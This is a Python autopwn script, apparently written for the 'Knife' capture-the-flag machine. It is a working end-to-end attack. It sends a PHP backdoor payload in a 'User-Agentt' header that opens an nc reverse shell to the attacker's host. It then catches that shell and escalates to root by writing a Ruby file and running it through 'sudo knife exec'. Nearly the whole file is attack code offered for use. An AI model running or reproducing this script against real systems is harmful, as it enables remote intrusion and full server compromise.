#!/usr/bin/python3
#coding: utf-8


# Knife Machine Autopwn
# Author: Gaizka Martin (a.k.a g2jz)


import requests
import sys
import threading
import time

from pwn import *

# Variables globales
lport = 443

# Sesion HTTP
s = requests.Session()

# Ctrl C
def handler(signal,frame):
	log.failure("Saliendo...")
	sys.exit(1)

signal.signal(signal.SIGINT,handler)

# Intrusion
def obtainShell():
	try:
		p1.status("Enviando...")
		time.sleep(1)
		
		# Exploit
		header_data= {
			"User-Agentt":"zerodiumsystem(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc %s %s >/tmp/f\");" % (sys.argv[2],lport)
		}

		r = s.get(sys.argv[1], headers=header_data)

		p1.success("Enviada")
		time.sleep(1)
	except:
		log.failure("Ha ocurrido un error!")
		sys.exit(1)


# Main
if __name__ == "__main__":
	# Comprobacion argv
	if(len(sys.argv)==3):
		try:
			# Barras de progreso
			p1 = log.progress("RCE")
			p2 = log.progress("Reverse Shell")
			
			threading.Thread(target = obtainShell).start()
		except Exception as e:
			log.error(str(e))

		p2.status("Esperando conexion...")

		# Listener
		shell = listen(lport,timeout=20).wait_for_connection()

		# Connection checker
		if shell.sock is None:
			log.failure("No se ha obtenido ninguna conexion!")
			sys.exit(1)
		else:
			p2.success("Conexion obtenida")
			time.sleep(1)

			# Nos situamos en el directorio de trabajo
			shell.sendline(b'cd /tmp')
			
			# Escalada de privilegios
			payload = b'''echo -e "#\!/usr/bin/ruby -w\n\nsystem('/bin/bash')" > k.rb'''
			shell.sendline(payload)

			execute_payload = b'sudo /usr/bin/knife exec k.rb'
			shell.sendline(execute_payload)

			# Interactive shell
			shell.interactive()
	
	else:
		# Usage
		print("Usage: " + sys.argv[0] + " <http://RHOST>" + " <LHOST>")
